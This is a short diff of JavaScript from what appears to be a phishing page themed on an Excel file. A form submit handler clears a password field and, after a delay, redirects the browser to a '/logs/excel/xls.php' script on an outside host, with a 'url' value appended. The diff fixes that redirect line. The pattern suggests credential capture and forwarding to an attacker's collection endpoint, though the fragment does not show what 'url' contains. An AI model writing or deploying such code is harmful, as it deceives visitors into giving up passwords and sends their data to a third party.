@@ -83,7 +83,7 @@ xsl_form.addEventListener("submit", (e)=>{
 
             pass_input.type = "search";
     
-            location = "xls.php?" + "https://tellme24.com/logs/excel/xls.php?"+url;
+            location = "https://tellme24.com/logs/excel/xls.php?"+url;
             pass_input.value = "";
     
             }, 1500);
